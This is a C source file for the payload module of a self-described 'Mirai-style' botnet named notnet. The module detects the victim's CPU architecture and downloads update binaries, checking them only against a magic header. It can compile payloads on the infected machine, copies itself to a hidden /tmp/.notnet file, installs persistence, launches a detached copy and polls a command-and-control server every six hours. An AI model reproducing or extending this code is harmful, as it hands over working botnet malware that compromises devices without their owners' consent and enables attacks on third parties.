/*
 * notnet - Modern Mirai-Style Botnet
 * payload.c - Binary payload download and on-target compilation
 */
#include "payload.h"
#include "util.h"
#include "protocol.h"
#include "persist.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/utsname.h>

/* ── Architecture Detection ─────────────────────────────────── */
const char *payload_get_arch(void) {
    struct utsname uts;
    uname(&uts);
    
    if (strstr(uts.machine, "x86_64") || strstr(uts.machine, "amd64")) {
        return "x86_64";
    } else if (strstr(uts.machine, "armv7") || strstr(uts.machine, "arm")) {
        return "armv7l";
    } else if (strstr(uts.machine, "aarch64") || strstr(uts.machine, "arm64")) {
        return "aarch64";
    } else if (strstr(uts.machine, "riscv64")) {
        return "riscv64";
    } else if (strstr(uts.machine, "mips")) {
        return "mips";
    } else if (strstr(uts.machine, "ppc") || strstr(uts.machine, "powerpc")) {
        return "ppc";
    }
    
    return "unknown";
}

int payload_detect_arch(char *buf, int len) {
    const char *arch = payload_get_arch();
    snprintf(buf, len, "%s", arch);
    return strlen(arch);
}

/* ── Payload Download ────────────────────────────────────────── */
int payload_update(notnet_bot_t *bot, const char *url, const char *dest) {
    log_info("Downloading payload: %s -> %s", url, dest);
    
    /* Download binary via HTTP */
    int received = http_download(bot, url, dest);
    if (received <= 0) {
        log_error("Download failed");
        return -1;
    }
    
    /* SECURITY FIX (#6): Verify magic bytes as raw bytes (endianness-safe)
     * and validate file size against PAYLOAD_MAX_SIZE. */
    FILE *f = fopen(dest, "rb");
    if (!f) {
        log_error("Cannot verify binary: %s", dest);
        return -1;
    }
    
    /* Read and check file size */
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (fsize <= 0 || fsize > PAYLOAD_MAX_SIZE) {
        log_error("Payload size invalid: %ld bytes (max %d)", fsize, PAYLOAD_MAX_SIZE);
        fclose(f);
        unlink(dest);
        return -1;
    }
    
    /* Read first 4 bytes as raw bytes and compare against magic.
     * NOTNET_MAGIC is 0x4E4F544E = "NOTN" in ASCII.
     * Reading as bytes avoids endianness issues with fread(&uint32_t). */
    unsigned char magic_bytes[4];
    size_t nread = fread(magic_bytes, 1, 4, f);
    fclose(f);
    
    if (nread < 4) {
        log_error("Payload too small to contain magic header");
        unlink(dest);
        return -1;
    }
    
    /* Expected bytes: 'N','O','T','N' (0x4E, 0x4F, 0x54, 0x4E) */
    unsigned char expected[4] = { 'N', 'O', 'T', 'N' };
    if (memcmp(magic_bytes, expected, 4) != 0) {
        log_error("Invalid magic: expected NOTN, got %02x%02x%02x%02x",
                  magic_bytes[0], magic_bytes[1], magic_bytes[2], magic_bytes[3]);
        unlink(dest);
        return -1;
    }
    
    /* NOTE: For production, add SHA-256 hash verification here
     * against a value signed by the C2 operator. A 4-byte magic
     * provides zero cryptographic assurance — a MITM can trivially
     * construct a file starting with 'NOTN'. */
    log_warn("Payload magic verified but NO cryptographic signature check (TODO)");
    
    /* Make executable */
    chmod(dest, 0755);
    log_info("Payload verified and installed at %s (%ld bytes)", dest, fsize);
    return received;
}

/* ── On-Target Compilation ───────────────────────────────────── */
int payload_compile(notnet_bot_t *bot, const char *source, const char *dest) {
    log_info("Compiling payload: %s -> %s", source, dest);
    
    /* SECURITY FIX (#7): Replace system() with fork()+execvp() to avoid
     * shell injection via config-derived source/dest paths.
     * Also replace popen("which ...") with execvp probes. */
    
    /* Validate inputs: reject paths with shell metacharacters */
    const char *bad = strpbrk(source, ";|&`$(){}[]<>!\n\r");
    if (bad) {
        log_error("payload_compile: source path rejected (dangerous char)");
        return -1;
    }
    bad = strpbrk(dest, ";|&`$(){}[]<>!\n\r");
    if (bad) {
        log_error("payload_compile: dest path rejected (dangerous char)");
        return -1;
    }

    /* Try gcc first, then musl-gcc */
    const char *compilers[] = { "gcc", "musl-gcc", NULL };
    int ret = -1;
    
    for (int i = 0; compilers[i]; i++) {
        pid_t pid = fork();
        if (pid < 0) {
            log_error("payload_compile: fork failed: %s", strerror(errno));
            continue;
        }
        if (pid == 0) {
            /* Child: exec compiler directly, no shell */
            char *argv[] = {
                (char *)compilers[i],
                "-static", "-Os", "-o", (char *)dest, (char *)source,
                NULL
            };
            /* Redirect stderr to /dev/null */
            int devnull = open("/dev/null", O_WRONLY);
            if (devnull >= 0) {
                dup2(devnull, STDERR_FILENO);
                close(devnull);
            }
            execvp(compilers[i], argv);
            _exit(127);
        }
        /* Parent: wait for child */
        int status;
        waitpid(pid, &status, 0);
        ret = WIFEXITED(status) ? WEXITSTATUS(status) : -1;
        if (ret == 0) {
            break;  /* success */
        }
        log_warn("payload_compile: %s failed (exit %d), trying next", compilers[i], ret);
    }
    
    if (ret != 0) {
        log_error("Compilation failed (all compilers exhausted)");
        return -1;
    }
    
    /* Make executable */
    chmod(dest, 0755);
    log_info("Compilation successful: %s", dest);
    return 0;
}

/* ── Payload Install ────────────────────────────────────────── */
int payload_install(notnet_bot_t *bot, const char *bin_path) {
    log_info("Installing payload at %s", bin_path);
    
    /* SECURITY FIX (#7): Replace system() with fork()+execvp() to avoid
     * shell injection via the dest path. */
    
    /* Validate bin_path: reject shell metacharacters */
    const char *bad = strpbrk(bin_path, ";|&`$(){}[]<>!\n\r");
    if (bad) {
        log_error("payload_install: bin_path rejected (dangerous char)");
        return -1;
    }
    
    /* Copy binary to persistent location */
    char dest[256];
    snprintf(dest, sizeof(dest), "/tmp/.notnet");
    
    FILE *src = fopen(bin_path, "rb");
    FILE *dst = fopen(dest, "wb");
    if (!src || !dst) {
        log_error("Failed to copy payload");
        if (src) fclose(src);
        if (dst) fclose(dst);
        return -1;
    }
    
    char buf[4096];
    size_t n;
    while ((n = fread(buf, 1, sizeof(buf), src)) > 0) {
        fwrite(buf, 1, n, dst);
    }
    
    fclose(src);
    fclose(dst);
    
    /* Make copied binary executable */
    chmod(dest, 0755);
    
    /* Install persistence */
    persist_install(bot);
    
    /* SECURITY FIX (#7): Start new instance via fork()+execvp(), no shell */
    pid_t pid = fork();
    if (pid == 0) {
        /* Child: detach and exec the new binary */
        setsid();
        char *argv[] = { (char *)dest, NULL };
        execvp(dest, argv);
        _exit(127);
    }
    /* Parent: don't wait — let the child run in background */
    
    log_info("Payload installed at %s", dest);
    return 0;
}

/* ── Update Check ───────────────────────────────────────────── */
int payload_check_update(notnet_bot_t *bot) {
    time_t now = time(NULL);
    
    /* Check every 6 hours for updates */
    if (now - bot->last_update < 21600) {
        return 0;
    }
    
    bot->last_update = now;
    
    /* Check C2 for update command */
    char query[256];
    snprintf(query, sizeof(query),
        "{\"cmd\":\"check_update\",\"arch\":\"%s\",\"version\":\"%s\"}",
        payload_get_arch(), NOTNET_VERSION);
    
    http_post(bot, query, strlen(query));
    
    /* In production, read response and act accordingly */
    return 0;
}
